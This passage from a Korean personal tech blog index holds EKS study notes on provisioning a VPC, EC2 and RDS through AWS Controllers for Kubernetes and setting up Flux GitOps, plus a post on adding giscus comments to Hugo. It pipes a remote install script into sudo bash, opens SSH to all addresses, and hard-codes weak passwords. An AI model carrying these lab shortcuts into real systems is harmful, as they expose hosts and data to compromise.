value: eip-tutorial --- apiVersion: ec2.services.k8s.aws/v1alpha1 kind: RouteTable metadata: name: tutorial-public-route-table spec: vpcRef: from: name: tutorial-vpc routes: - destinationCIDRBlock: 0.0.0.0/0 gatewayRef: from: name: tutorial-igw --- apiVersion: ec2.services.k8s.aws/v1alpha1 kind: RouteTable metadata: name: tutorial-private-route-table-az1 spec: vpcRef: from: name: tutorial-vpc routes: - destinationCIDRBlock: 0.0.0.0/0 natGatewayRef: from: name: tutorial-natgateway1 --- apiVersion: ec2.services.k8s.aws/v1alpha1 kind: Subnet metadata: name: tutorial-public-subnet1 spec: availabilityZone: ap-northeast-2a cidrBlock: 10.0.0.0/20 mapPublicIPOnLaunch: true vpcRef: from: name: tutorial-vpc routeTableRefs: - from: name: tutorial-public-route-table --- apiVersion: ec2.services.k8s.aws/v1alpha1 kind: Subnet metadata: name: tutorial-private-subnet1 spec: availabilityZone: ap-northeast-2a cidrBlock: 10.0.128.0/20 vpcRef: from: name: tutorial-vpc routeTableRefs: - from: name: tutorial-private-route-table-az1 --- apiVersion: ec2.services.k8s.aws/v1alpha1 kind: SecurityGroup metadata: name: tutorial-security-group spec: description: \u0026#34;ack security group\u0026#34; name: tutorial-sg vpcRef: from: name: tutorial-vpc ingressRules: - ipProtocol: tcp fromPort: 22 toPort: 22 ipRanges: - cidrIP: \u0026#34;0.0.0.0/0\u0026#34; description: \u0026#34;ingress\u0026#34; EOF kubectl apply -f vpc-workflow.yaml # VPC 환경 생성 확인 kubectl describe vpcs kubectl describe internetgateways kubectl describe routetables kubectl describe natgateways kubectl describe elasticipaddresses kubectl describe securitygroups Public Subnet에 인스턴스 생성 # public 서브넷 ID 확인 PUBSUB1=$(kubectl get subnets tutorial-public-subnet1 -o jsonpath={.status.subnetID}) echo $PUBSUB1 # 보안그룹 ID 확인 TSG=$(kubectl get securitygroups tutorial-security-group -o jsonpath={.status.id}) echo $TSG # Amazon Linux 2 최신 AMI ID 확인 AL2AMI=$(aws ec2 describe-images --owners amazon --filters \u0026#34;Name=name,Values=amzn2-ami-hvm-2.0.*-x86_64-gp2\u0026#34; --query \u0026#39;Images[0].ImageId\u0026#39; --output text) echo $AL2AMI # SSH 키페어 이름 변수 지정: 사용할 AWS keypair MYKEYPAIR=ryzen1600 # 변수 확인 \u0026gt; 특히 서브넷 ID가 확인되었는지 꼭 확인하자! echo $PUBSUB1 , $TSG , $AL2AMI , $MYKEYPAIR # 모니터링 준비 while true; do aws ec2 describe-instances --query \u0026#34;Reservations[*].Instances[*].{PublicIPAdd:PublicIpAddress,PrivateIPAdd:PrivateIpAddress,InstanceName:Tags[?Key==\u0026#39;Name\u0026#39;]|[0].Value,Status:State.Name}\u0026#34; --filters Name=instance-state-name,Values=running --output table; date ; sleep 1 ; done # public 서브넷에 인스턴스 생성 cat \u0026lt;\u0026lt;EOF \u0026gt; tutorial-bastion-host.yaml apiVersion: ec2.services.k8s.aws/v1alpha1 kind: Instance metadata: name: tutorial-bastion-host spec: imageID: $AL2AMI # AL2 AMI ID - ap-northeast-2 instanceType: t3.medium subnetID: $PUBSUB1 securityGroupIDs: - $TSG keyName: $MYKEYPAIR tags: - key: producer value: ack EOF kubectl apply -f tutorial-bastion-host.yaml # 인스턴스 생성 확인 kubectl get instance kubectl describe instance aws ec2 describe-instances --query \u0026#34;Reservations[*].Instances[*].{PublicIPAdd:PublicIpAddress,PrivateIPAdd:PrivateIpAddress,InstanceName:Tags[?Key==\u0026#39;Name\u0026#39;]|[0].Value,Status:State.Name}\u0026#34; --filters Name=instance-state-name,Values=running --output table Public Subnet의 인스턴스에 접속 ping test 실패해야 정상 ## Client PC ssh -i ${사용할 keypair} ec2-user@${앞에서 확인한 Public IP} ping -c 2 8.8.8.8 보안 그룹 정책 수정: egress 규칙 추가 cat \u0026lt;\u0026lt;EOF \u0026gt; modify-sg.yaml apiVersion: ec2.services.k8s.aws/v1alpha1 kind: SecurityGroup metadata: name: tutorial-security-group spec: description: \u0026#34;ack security group\u0026#34; name: tutorial-sg vpcRef: from: name: tutorial-vpc ingressRules: - ipProtocol: tcp fromPort: 22 toPort: 22 ipRanges: - cidrIP: \u0026#34;0.0.0.0/0\u0026#34; description: \u0026#34;ingress\u0026#34; egressRules: - ipProtocol: \u0026#39;-1\u0026#39; ipRanges: - cidrIP: \u0026#34;0.0.0.0/0\u0026#34; description: \u0026#34;egress\u0026#34; EOF kubectl apply -f modify-sg.yaml # 변경 확인 \u0026gt;\u0026gt; 보안그룹에 아웃바운드 규칙 확인 kubectl logs -n $ACK_SYSTEM_NAMESPACE -l k8s-app=ec2-chart -f 다시, Public Subnet상 인스턴스 접속 상태에서, ping test: 정상 curl로 출력되는 IP는 인스턴스 Public IP 주소 ## Client PC # ssh -i ${사용할 keypair} ec2-user@${앞에서 확인한 Public IP} ping -c 2 8.8.8.8 curl ipinfo.io/ip ; echo # 인스턴스 Public UP(공인IP) exit Private Subnet에 인스턴스 생성 2-3 실습에서도 봤듯이 Private Subnet ID 확인까지 시간 소요 # private 서브넷 ID 확인 PRISUB1=$(kubectl get subnets tutorial-private-subnet1 -o jsonpath={.status.subnetID}) echo $PRISUB1 # 변수 확인 echo $PRISUB1 , $TSG , $AL2AMI , $MYKEYPAIR # Private Subnet에 인스턴스 생성 cat \u0026lt;\u0026lt;EOF \u0026gt; tutorial-instance-private.yaml apiVersion: ec2.services.k8s.aws/v1alpha1 kind: Instance metadata: name: tutorial-instance-private spec: imageID: $AL2AMI # AL2 AMI ID - ap-northeast-2 instanceType: t3.medium subnetID: $PRISUB1 securityGroupIDs: - $TSG keyName: $MYKEYPAIR tags: - key: producer value: ack EOF kubectl apply -f tutorial-instance-private.yaml # 인스턴스 생성 확인 kubectl get instance kubectl describe instance aws ec2 describe-instances --query \u0026#34;Reservations[*].Instances[*].{PublicIPAdd:PublicIpAddress,PrivateIPAdd:PrivateIpAddress,InstanceName:Tags[?Key==\u0026#39;Name\u0026#39;]|[0].Value,Status:State.Name}\u0026#34; --filters Name=instance-state-name,Values=running --output table Public Subnet 인스턴스에 SSH 터널링 설정 터널링이므로, 접속 이후 그대로 두기 실습에서는 임의 포트를 9999로 설정 ssh -i ~/.ssh/id_ed25518 -L 9999:${Private Subnet의 인스턴스 private IP}:22 ec2-user@${Public Subnet의 인스턴스 public IP} -v 앞에서 설정한 임의 설정 포트(9999)로 SSH 접속 시 Private Subnet의 인스턴스에 접속 가능 [Jump Host] ssh -i ~/.ssh/id_ed25519 -p 9999 ec2-user@localhost # IP 및 네트워크 정보 확인 ip -c addr sudo ss -tnp ping -c 2 8.8.8.8 curl ipinfo.io/ip ; echo # NATGW IP exit 실습 후 리소스 삭제 VPC 관련 모든 리소스 삭제 시, 다소 시간이 소요 kubectl delete -f tutorial-bastion-host.yaml \u0026amp;\u0026amp; kubectl delete -f tutorial-instance-private.yaml kubectl delete -f vpc-workflow.yaml 2-5. RDS 생성 지원 엔진: Aurora(MySQL, PostgreSQL), RDS(MySQL, MariaDB, Oracle, SQL Server)\n[ACK RDS Controller 설치]\n# 서비스명 변수 지정 및 helm 차트 다운로드 export SERVICE=rds export RELEASE_VERSION=$(curl -sL https://api.github.com/repos/aws-controllers-k8s/$SERVICE-controller/releases/latest | grep \u0026#39;\u0026#34;tag_name\u0026#34;:\u0026#39; | cut -d\u0026#39;\u0026#34;\u0026#39; -f4 | cut -c 2-) helm pull oci://public.ecr.aws/aws-controllers-k8s/$SERVICE-chart --version=$RELEASE_VERSION tar xzvf $SERVICE-chart-$RELEASE_VERSION.tgz # helm chart 확인 tree ~/$SERVICE-chart # ACK EC2-Controller 설치 export ACK_SYSTEM_NAMESPACE=ack-system export AWS_REGION=ap-northeast-2 helm install -n $ACK_SYSTEM_NAMESPACE ack-$SERVICE-controller --set aws.region=\u0026#34;$AWS_REGION\u0026#34; ~/$SERVICE-chart # 설치 확인 helm list --namespace $ACK_SYSTEM_NAMESPACE kubectl -n $ACK_SYSTEM_NAMESPACE get pods -l \u0026#34;app.kubernetes.io/instance=ack-$SERVICE-controller\u0026#34; kubectl get crd | grep $SERVICE [IRSA 설정] AmazonRDSFullAccess eksctl create iamserviceaccount \\ --name ack-$SERVICE-controller \\ --namespace $ACK_SYSTEM_NAMESPACE \\ --cluster $CLUSTER_NAME \\ --attach-policy-arn $(aws iam list-policies --query \u0026#39;Policies[?PolicyName==`AmazonRDSFullAccess`].Arn\u0026#39; --output text) \\ --override-existing-serviceaccounts --approve eksctl get iamserviceaccount --cluster $CLUSTER_NAME kubectl get sa -n $ACK_SYSTEM_NAMESPACE kubectl describe sa ack-$SERVICE-controller -n $ACK_SYSTEM_NAMESPACE kubectl -n $ACK_SYSTEM_NAMESPACE rollout restart deploy ack-$SERVICE-controller-$SERVICE-chart # Env, projected Volume 추가 확인 kubectl describe pod -n $ACK_SYSTEM_NAMESPACE -l k8s-app=$SERVICE-chart [리소스 조작] AWS RDS for MariaDB 생성 및 삭제 모니터링 준비: watch -d \u0026quot;kubectl describe dbinstance \u0026quot;${RDS_INSTANCE_NAME}\u0026quot; | grep 'Db Instance Status'\u0026quot; # DB 암호를 위한 secret 생성 RDS_INSTANCE_NAME=myrds RDS_INSTANCE_PASSWORD=qwe12345 kubectl create secret generic \u0026#34;${RDS_INSTANCE_NAME}-password\u0026#34; --from-literal=password=\u0026#34;${RDS_INSTANCE_PASSWORD}\u0026#34; # 확인 kubectl get secret $RDS_INSTANCE_NAME-password # RDS 배포 생성 : 15분 이내 시간 소요 \u0026gt;\u0026gt; 보안그룹, 서브넷 등 필요한 옵션들은 추가해서 설정해보자! cat \u0026lt;\u0026lt;EOF \u0026gt; rds-mariadb.yaml apiVersion: rds.services.k8s.aws/v1alpha1 kind: DBInstance metadata: name: \u0026#34;${RDS_INSTANCE_NAME}\u0026#34; spec: allocatedStorage: 20 dbInstanceClass: db.t4g.micro dbInstanceIdentifier: \u0026#34;${RDS_INSTANCE_NAME}\u0026#34; engine: mariadb engineVersion: \u0026#34;10.6\u0026#34; masterUsername: \u0026#34;admin\u0026#34; masterUserPassword: namespace: default name: \u0026#34;${RDS_INSTANCE_NAME}-password\u0026#34; key: password EOF kubectl apply -f rds-mariadb.yaml # 생성 확인 kubectl get dbinstances ${RDS_INSTANCE_NAME} kubectl describe dbinstance \u0026#34;${RDS_INSTANCE_NAME}\u0026#34; aws rds describe-db-instances --db-instance-identifier $RDS_INSTANCE_NAME | jq # Db Instance Status: creating/backing-up/available kubectl describe dbinstance \u0026#34;${RDS_INSTANCE_NAME}\u0026#34; | grep \u0026#39;Db Instance Status\u0026#39; # 생성 완료 대기 : for 지정 상태가 완료되면 정상 종료됨 # dbinstance.rds.services.k8s.aws/myrds condition met kubectl wait dbinstances ${RDS_INSTANCE_NAME} --for=condition=ACK.ResourceSynced --timeout=15m 2-6. Maria DB 접속 RDS를 사용하는 파드를 생성하여 테스트 fieldexport를 먼저 생성 후 이를 활용 RDS_INSTANCE_CONN_CM=\u0026#34;${RDS_INSTANCE_NAME}-conn-cm\u0026#34; cat \u0026lt;\u0026lt;EOF \u0026gt; rds-field-exports.yaml --- apiVersion: v1 kind: ConfigMap metadata: name: ${RDS_INSTANCE_CONN_CM} data: {} --- apiVersion: services.k8s.aws/v1alpha1 kind: FieldExport metadata: name: ${RDS_INSTANCE_NAME}-host spec: to: name: ${RDS_INSTANCE_CONN_CM} kind: configmap from: path: \u0026#34;.status.endpoint.address\u0026#34; resource: group: rds.services.k8s.aws kind: DBInstance name: ${RDS_INSTANCE_NAME} --- apiVersion: services.k8s.aws/v1alpha1 kind: FieldExport metadata: name: ${RDS_INSTANCE_NAME}-port spec: to: name: ${RDS_INSTANCE_CONN_CM} kind: configmap from: path: \u0026#34;.status.endpoint.port\u0026#34; resource: group: rds.services.k8s.aws kind: DBInstance name: ${RDS_INSTANCE_NAME} --- apiVersion: services.k8s.aws/v1alpha1 kind: FieldExport metadata: name: ${RDS_INSTANCE_NAME}-user spec: to: name: ${RDS_INSTANCE_CONN_CM} kind: configmap from: path: \u0026#34;.spec.masterUsername\u0026#34; resource: group: rds.services.k8s.aws kind: DBInstance name: ${RDS_INSTANCE_NAME} EOF kubectl apply -f rds-field-exports.yaml # 상태 정보 확인 : address 와 port 정보 kubectl get dbinstances myrds -o jsonpath={.status.endpoint} | jq # 상태 정보 확인 : masterUsername 확인 kubectl get dbinstances myrds -o jsonpath={.spec.masterUsername} ; echo # 컨피그맵 확인 kubectl get cm myrds-conn-cm -o yaml | kubectl neat | yh # fieldexport 정보 확인 kubectl get crd | grep fieldexport kubectl get fieldexport kubectl get fieldexport myrds-host -o yaml | k neat | yh RDS 사용 파드 생성 APP_NAMESPACE=default cat \u0026lt;\u0026lt;EOF \u0026gt; rds-pods.yaml apiVersion: v1 kind: Pod metadata: name: app namespace: ${APP_NAMESPACE} spec: containers: - image: busybox name: myapp command: - sleep - \u0026#34;3600\u0026#34; imagePullPolicy: IfNotPresent env: - name: DBHOST valueFrom: configMapKeyRef: name: ${RDS_INSTANCE_CONN_CM} key: \u0026#34;${APP_NAMESPACE}.${RDS_INSTANCE_NAME}-host\u0026#34; - name: DBPORT valueFrom: configMapKeyRef: name: ${RDS_INSTANCE_CONN_CM} key: \u0026#34;${APP_NAMESPACE}.${RDS_INSTANCE_NAME}-port\u0026#34; - name: DBUSER valueFrom: configMapKeyRef: name: ${RDS_INSTANCE_CONN_CM} key: \u0026#34;${APP_NAMESPACE}.${RDS_INSTANCE_NAME}-user\u0026#34; - name: DBPASSWORD valueFrom: secretKeyRef: name: \u0026#34;${RDS_INSTANCE_NAME}-password\u0026#34; key: password EOF kubectl apply -f rds-pods.yaml # 생성 확인 kubectl get pod app # 파드의 환경 변수 확인 kubectl exec -it app -- env | grep DB RDS의 identifier(접속 식별자)를 변경해보고 확인 Roll-out이 아닌, 새로운 식별자를 기반으로 RDS가 생성 모니터링 준비: watch -d \u0026quot;kubectl get dbinstance; echo; kubectl get cm myrds-conn-cm -o yaml | kubectl neat\u0026quot; # DB 식별자를 업데이트 kubectl patch dbinstance myrds --type=merge -p \u0026#39;{\u0026#34;spec\u0026#34;:{\u0026#34;dbInstanceIdentifier\u0026#34;:\u0026#34;studyend\u0026#34;}}\u0026#39; # 확인 kubectl get dbinstance myrds kubectl describe dbinstance myrds 변경 정보 반영 확인 RDS address: 변경 확인 (\u0026quot;address\u0026quot;: \u0026quot;studyend.-\u0026quot;) pod 환경변수: 변경되지 않음 (DBHOST=myrds.-) 환경 변수(env)로 정보를 주입했기 때문에 업데이트 되지 않음 pod rollout으로 env 변경 적용 가능 (deployments/daemonsets/statefulsets) # 상태 정보 확인 : address 변경 확인! kubectl get dbinstances myrds -o jsonpath={.status.endpoint} | jq # 파드의 환경 변수 확인 \u0026gt;\u0026gt; 파드의 경우 환경 변수 env로 정보를 주입했기 때문에 변경된 정보를 확인 할 수 없다 kubectl exec -it app -- env | grep DB # 파드 삭제 후 재생성 후 확인 kubectl delete pod app \u0026amp;\u0026amp; kubectl apply -f rds-pods.yaml # 파드의 환경 변수 업데이트 확인! kubectl exec -it app -- env | grep DB RDS 삭제: 단, ACK의 관리에서 벗어난 myrds는 직접 삭제해야함 # 파드 삭제 kubectl delete pod app # RDS 삭제 kubectl delete -f rds-mariadb.yaml 3. Flux Flux하면, f.lux 시간별 화면 색조 변경프로그램이 떠오르는데\u0026hellip; 아쉽지만, 이번엔 GitOps용 솔루션. GitHub 토큰을 활용 한번 생성되고, 재 조회가 안되므로 메모를 하거나 다시 생성 같은 계정에서 발급한 다른 토큰을 써도 Flux사용은 연속적으로 사용 가능 부트스트랩으로 Github private repo 생성 후, manifest 추가하여 사용 # Flux CLI 설치 curl -s https://fluxcd.io/install.sh | sudo bash . \u0026lt;(flux completion bash) # 버전 확인 flux --version # GitHub 토큰 주입 export GITHUB_TOKEN=${ghp_###} export GITHUB_USER=kkumtree # Bootstrap flux bootstrap github \\ --owner=$GITHUB_USER \\ --repository=fleet-infra \\ --branch=main \\ --path=./clusters/my-cluster \\ --personal # 설치 확인 # GitHub에서 신규 private repo(fleet-infra) 생성 확인 kubectl get pods -n flux-system kubectl get-all -n flux-system kubectl get crd | grep fluxc kubectl get gitrepository -n flux-system GitOps 도구 설치: flux 대시보드 admin / password ingress 설정: p8s, grafana 설치를 안했다면 시간 소요 # gitops 도구 설치 curl --silent --location \u0026#34;https://github.com/weaveworks/weave-gitops/releases/download/v0.24.0/gitops-$(uname)-$(uname -m).tar.gz\u0026#34; | tar xz -C /tmp sudo mv /tmp/gitops /usr/local/bin gitops version # flux 대시보드 설치 PASSWORD=\u0026#34;password\u0026#34; gitops create dashboard ww-gitops --password=$PASSWORD # 확인 flux -n flux-system get helmrelease kubectl -n flux-system get pod,svc # ingress 배포를 위한 ACM ARN CERT_ARN=`aws acm list-certificates --query \u0026#39;CertificateSummaryList[].CertificateArn[]\u0026#39; --output text` echo $CERT_ARN # Ingress 설정 cat \u0026lt;\u0026lt;EOT \u0026gt; gitops-ingress.yaml apiVersion: networking.k8s.io/v1 kind: Ingress metadata: name: gitops-ingress annotations: alb.ingress.kubernetes.io/certificate-arn: $CERT_ARN alb.ingress.kubernetes.io/group.name: study alb.ingress.kubernetes.io/listen-ports: \u0026#39;[{\u0026#34;HTTPS\u0026#34;:443}, {\u0026#34;HTTP\u0026#34;:80}]\u0026#39; alb.ingress.kubernetes.io/load-balancer-name: myeks-ingress-alb alb.ingress.kubernetes.io/scheme: internet-facing alb.ingress.kubernetes.io/ssl-redirect: \u0026#34;443\u0026#34; alb.ingress.kubernetes.io/success-codes: 200-399 alb.ingress.kubernetes.io/target-type: ip spec: ingressClassName: alb rules: - host: gitops.$MyDomain http: paths: - backend: service: name: ww-gitops-weave-gitops port: number: 9001 path: / pathType: Prefix EOT kubectl apply -f gitops-ingress.yaml -n flux-system # 배포 확인 kubectl get ingress -n flux-system # GitOps 접속 정보 확인 \u0026gt;\u0026gt; 웹 접속 후 정보 확인 echo -e \u0026#34;GitOps Web https://gitops.$MyDomain\u0026#34; 3-1. kustomize 예제로 샘플 실습 모니터링 준비: watch -d kubectl get pod,svc nginx-example1 GitHub에 있는 Nginx manifest를 k8s에 배포 배포 시에 kustomize를 사용 flux 지원 소스: git / helm / oci / bucket `flux create source {target source} GITURL=\u0026#34;https://github.com/sungwook-practice/fluxcd-test.git\u0026#34; flux create source git nginx-example1 --url=$GITURL --branch=main --interval=30s # 소스 확인 flux get sources git kubectl -n flux-system get gitrepositories # flux 애플리케이션 생성: 유형(kustomization), git 소스 경로(--path) # 생성 후 GitOps 대시보드에서 확인 flux create kustomization nginx-example1 --target-namespace=default --interval=1m --source=nginx-example1 --path=\u0026#34;./nginx\u0026#34; --health-check-timeout=2m kubectl get pod,svc nginx-example1 kubectl get kustomizations -n flux-system flux get kustomizations 애플리케이션 삭제 처음 삭제 시: pod, svc는 사라지지 않음. annotation 개념 --prune=true를 통해 같이 삭제되도록 할 수 있음 (default: false) # flux 애플리케이션 삭제 flux delete kustomization nginx-example1 flux get kustomizations kubectl get pod,svc nginx-example1 # flux 애플리케이션 다시 생성 : --prune 옵션 true flux create kustomization nginx-example1 \\ --target-namespace=default \\ --prune=true \\ --interval=1m \\ --source=nginx-example1 \\ --path=\u0026#34;./nginx\u0026#34; \\ --health-check-timeout=2m # 확인 flux get kustomizations kubectl get pod,svc nginx-example1 # flux 애플리케이션 삭제: pod, svc 함께 삭제 flux delete kustomization nginx-example1 flux get kustomizations kubectl get pod,svc nginx-example1 # flux 소스 삭제 flux delete source git nginx-example1 # 소스 확인 flux get sources git kubectl -n flux-system get gitrepositories 3-2. Flux 공식 Docs 샘플 실습 앞서 최성욱(악성코드분석)님께서 만들어주신 샘플로 계속 하려 했으나, 샘플 실습에서의 replica 변경이 적용되지 않아 새로이 진행 모니터링 준비: watch -d kubectl get pod,svc scale down 시 pod가 삭제되었다가, 다시 재생성 됨 # Clone the git repository : 자신의 Github 의 Username, Token 입력 # Username for \u0026#39;https://github.com\u0026#39;: \u0026lt;자신의 Github 의 Username\u0026gt; # Password for \u0026#39;https://kkumtree@github.com\u0026#39;: \u0026lt;자신의 Github의 Token\u0026gt; git clone https://github.com/$GITHUB_USER/fleet-infra cd fleet-infra tree ## ADD podinfo repository to Flux # GitRepository yaml 파일 생성 flux create source git podinfo \\ --url=https://github.com/stefanprodan/podinfo \\ --branch=master \\ --interval=30s \\ --export \u0026gt; ./clusters/my-cluster/podinfo-source.yaml # GitRepository yaml 파일 확인 cat ./clusters/my-cluster/podinfo-source.yaml | yh # Commit and push the podinfo-source.yaml file to the fleet-infra repository git config --global user.name \u0026#34;Your Name\u0026#34; git config --global user.email \u0026#34;you@example.com\u0026#34; git add -A \u0026amp;\u0026amp; git commit -m \u0026#34;Add podinfo GitRepository\u0026#34; git push Username for \u0026#39;https://github.com\u0026#39;: \u0026lt;자신의 Github 의 Username\u0026gt; Password for \u0026#39;https://gasida@github.com\u0026#39;: \u0026lt;자신의 Github의 Token\u0026gt; # 소스 확인 flux get sources git kubectl -n flux-system get gitrepositories ## Deploy podinfo application ## Configure Flux to build and apply the kustomize directory located in the podinfo repository # Use the flux create command to create a Kustomization that applies the podinfo deployment. flux create kustomization podinfo \\ --target-namespace=default \\ --source=podinfo \\ --path=\u0026#34;./kustomize\u0026#34; \\ --prune=true \\ --interval=5m \\ --export \u0026gt; ./clusters/my-cluster/podinfo-kustomization.yaml # 파일 확인 cat ./clusters/my-cluster/podinfo-kustomization.yaml | yh # Commit and push the Kustomization manifest to the repository: git add -A \u0026amp;\u0026amp; git commit -m \u0026#34;Add podinfo Kustomization\u0026#34; git push # 확인 kubectl get pod,svc kubectl get kustomizations -n flux-system flux get kustomizations tree ## Watch Flux sync the application kubectl scale deployment podinfo --replicas 1 kubectl scale deployment podinfo --replicas 3 ## 삭제 flux delete kustomization podinfo flux delete source git podinfo flux uninstall --namespace=flux-system ","date":"2023-06-10T15:13:19+09:00","permalink":"https://blog.minseong.xyz/post/aws-eks-study-week7/","section":"post","tags":["AWS","EKS","CloudNet@","automation","ACK","flux"],"title":"AWS EKS 스터디 7주차 - Automation"},{"categories":null,"contents":"요약 앞으로 가감없는 피드백 환영합니다. https://github.com/kkumtree/blog.minseong.xyz/commit/e17822e72e8d357dcdbda1025c5372161a7b93ff\n배경 gh-pages로 블로그를 구축해서, 첫 게시물을 올린 지 만 4개월이 지났다.\n구축기는 나중에 올려야지.\n급히 벤치마킹해서 올린거라, 부족한 점은 많지만 가장 중요한 댓글 기능이 없어서 아쉬웠다.\n원래는 댓글을 달지 않으려고 했는데,\n부족한 부분에 대해서 조언도 받아보고 싶고 추가로 궁금한 점이나 이해가 안되는 부분에 대해서 피드백도 받고 싶었다. 다른 블로그에서 답을 찾으려고 검색엔진을 돌리면, 뭔가 2% 부족하거나 / 내가 원하는 해답이 아니거나 / 매번 이모티콘으로 끝나는 특유의 허탈감으로 짜증이 밀려와서 번역기 돌려가며 국외 포스트나 문서를 보다보니, 반대로 내 글도 큰 도움이 되지 못할 경우도 있겠다 싶었다. 그래서 댓글 기능을 추가하기로 했다.\ngiscus 선정 사실은 disqus를 사용하려고 했다. 아는 것 중 유명한게 그거 밖에 없었다. 그러다가 원래 벤치마킹하고 있던 한영빈님 블로그를 살펴보니 giscus를 사용하고 있었고, 뭔가 해서 공식홈페이지를 살펴보았다.\n소스코드 보기 전에 이미 disqus 계정 생성했는데, 가입 이후 안들어가게 되었다.\nGitHub repo에서 제공하는 Discussions으로 댓글 기능을 구현한다. GitHub 의존성은 있지만, 어차피 gh-pages로 운영 중이라 일관성이 있다. 작성을 위한 로그인은 GitHub OAuth로 이루어진다.\n예전에 inflearn에서 facebook 소셜로그인 오류난 거가 생각나서,\nOAuth는 안정적이어야 한다고 생각한다. Meta OAuth는 지양하고 있다.\n(줔아저씨가 ibus 다국어 입력도 좀 받아줬으면 한다. 트래커 얼마나 다신거야.) 임베딩이 엄청 쉽다. 눈대중으로 정상 구동 될 정도라니,\ngh-pages에 vanila-framwork 테마 입힐 때를 생각하면 감격 수준이다. 비밀 댓글이 없다. 개인적 취향인데, 비밀 댓글로 보낼 일이면 이메일이나 다른 연락수단을 취하면 될 일이 아닌가 싶다. giscus 적용 시 유의할 점 repoID 및 categoryID: Docs 관련 항상 전해지는 글귀가 있다. RTFM\u0026hellip; 이라고. 처음에는 이걸 어떻게 획득하는 거지? 이러고 있다가, 공식홈페이지에 이것저것 입력해보니 키값이 나왔다. 너무나도 짧은 quick start 가이드라서 설?마하고 안 읽었는데 역시나였다. 그냥 하라는 대로 하자.\n당연히, 기존의 페이지 구조를 이해하고 있어야 한다. 프레임워크를 제외한, 커스텀된 부분마저도 나처럼 다른 블로그를 벤치마킹했다면 기존의 페이지 구조를 파악해야 한다. 국외 블로그만 참고하고, 무지성으로 layouts/_default/single.html에 넣었다가 헛발질을 했다. 처음에 어떻게 Hugo 구성했었는지 잊고지내서, 바로 layouts/post/single.html쪽을 바라보게 했다는 것을 인지하는데 시간이 걸렸다. 적용순서 추천: 공식홈페이지의 quick start를 따라하자. GitHub discussion 활성화:\nGitHub repo는 기본적으로 discussion이 열려있지 않다.\nSettings \u0026gt; General \u0026gt; Features \u0026gt; Discussions을 활성화한다. giscus 앱 설치(Github Apps):\n나중에 부연설명을 해야될 것 같기도 한데, 이 부분은 다른 분들이 잘 기술해주셔서 크게 곤란해질 일은 없다. 앱을 설치할 때, 권한 부여를 계정 전역으로 할지, repo별로 할지 선택할 수 있다. 블로그 repo에만 권한을 주었다. 퍼미션은 Read access to metadata / Read and write access to discussions 두 가지다. (CRUD) discussion category format 설정: 공식홈페이지에서는 두리뭉술하게 GitHub Docs만 게시했는데 2가지 길이 있다. Announcement 속성: maintainer만 관리할 수 있다.\nDiscussion에 대한 직접적인 CRUD가 giscus 앱을 포함한 maintainer만 가능하다. (블로그 페이지에서 작성자가 게시 -\u0026gt; giscus app이 직접 repo의 Discussion 게시 -\u0026gt; repo에서 수정/삭제는 maintainer만 가능) 나머지 속성들은 그렇지 않다.\n테스트 해보고 아니다 싶으면 다른 카테고리를 바라보게 하면 된다. config 임베딩: 당연히 YAML과 TOML 방식이 다르다.\n하지만 단순해서 만들어진 bolierplate를 참조하면 손을 좀만 보면 된다. 처음 구축할 때, 시인성으로 TOML 을 적용했기에 다른 코드 참조하면서 환경변수 및 스크립트 임베딩을하면 된다. giscus 임베딩: 구조에 맞춰 알맞게 넣고, CSS가 잘 적용되는지 조정하면 완료 ","date":"2023-06-04T09:15:14+09:00","permalink":"https://blog.minseong.xyz/post/how-to-add-comment-section-in-gh-pages/","section":"post","tags":["gh-pages","Hugo","giscus","disqus","blog"],"title":"gh-pages에 댓글 기능 추가하기(giscus/Hugo)"},{"categories":null,"contents":"이번에는 보안을 위한 인증 및 인가, 그리고 IRSA를 중심으로 EKS의 보안에 대해 학습해보았습니다.\nkops 스터디 때에는 잘 몰랐는데, RBAC 뿐만 아니라 복기하다보니\u0026hellip;\n[4-1] projected Volume [4-2] AWS Load Balancer Controller IRSA 및 LB Pod mutating 위의 두 가지가 중요한 파트를 차지하고 있었음을 알 수 있었습니다.\nNetwork(2주차)가 매번 뭔가 일부가 아리송하였다면\nSecurity는 복기하다가 이론적으로는 간단(과연?)해보여도\n실제 구동방식 이해 자체가 초반에 안되서, 사흘 남짓 걸린 덕에 더 어려웠던 것 같습니다.\n그 외 myeks-bastion-2에 접속 시, 함께 진행할 때는 ssh {Public IP}로 잘 접속되는 걸 봤는데 정작 혼자 할 땐 접속이 되지않았습니다. Amazon Linux에서는 ssh ec2-user@{Public IP}로 접속해야함\n(필요한 경우 ssh키도 포함) AWS Public AMI에서 제공되는 Ubuntu AMI의 경우,\nubuntu@{Public IP}로 접속가능 추정: 공유된 머신에 다른 설정이 이슈가 되는 것으로 추정됩니다. IAM User(testuser)는 웹콘솔에서 삭제하는 것이 편리합니다. 아니면, 아래처럼 detach 한다는 느낌으로 순차적 실행합니다. list-attached-role-policies \u0026amp;\u0026amp; detach-role-policy list-access-keys \u0026amp;\u0026amp; delete-access-key delete-user CLI로 IAM Trust Relationship 조회 웹 콘솔에 굳이 들어가야하나 하고, 문득 호기심에 시도하다가 시간이 날아갔습니다. 결론: 하드코어한 파싱.. jq -r '.[].status.roleARN' | rev | cut -d '/' -f1 | rev chatGPT에게 아래와 같이 교정 받았지만, 탐탁치 않음..\njq -r '.[].status.roleARN' | grep -oE '[^/]+$'\n1. 실습 환경 배포 모의공격(?) 테스트를 위해 2개의 bastion 서버가 구성된 환경 배포 p8s 및 grafana의 경우, 선택적으로 배포해도 되서 기술 생략 curl -O https://s3.ap-northeast-2.amazonaws.com/cloudformation.cloudneta.net/K8S/eks-oneclick5.yaml # 이하 중략 # CERT_ARN(ACM)의 경우에는 /etc/profile에 환경변수 저장을 안해둬서 # 세션이 만료되면, 다시 재설정 필요 CERT_ARN=`aws acm list-certificates --query \u0026#39;CertificateSummaryList[].CertificateArn[]\u0026#39; --output text` echo $CERT_ARN 2. k8s 인증/인가 .kube/config 파일을 기반 cluster: k8s API 서버 접속정보 users: API 서버에 접속하기 위한 유저 인증정보 목록 contexts: cluster및 user를 매핑(조합)한 정보 2-1. 인증/인가 실습 여기서는 인프라팀, 개발팀으로 각각의 ns에 유저를 생성하여 실습 kubectl create namespace dev-team kubectl create ns infra-team kubectl get ns # 네임스페이스에 서비스 어카운트 생성 kubectl create sa dev-k8s -n dev-team kubectl create sa infra-k8s -n infra-team # 서비스 어카운트 정보 확인 kubectl get sa -n dev-team kubectl get sa dev-k8s -n dev-team -o yaml | yh kubectl get sa -n infra-team kubectl get sa infra-k8s -n infra-team -o yaml | yh # dev-k8s 서비스 어카운트의 토큰 획득 DevTokenName=$(kubectl get sa dev-k8s -n dev-team 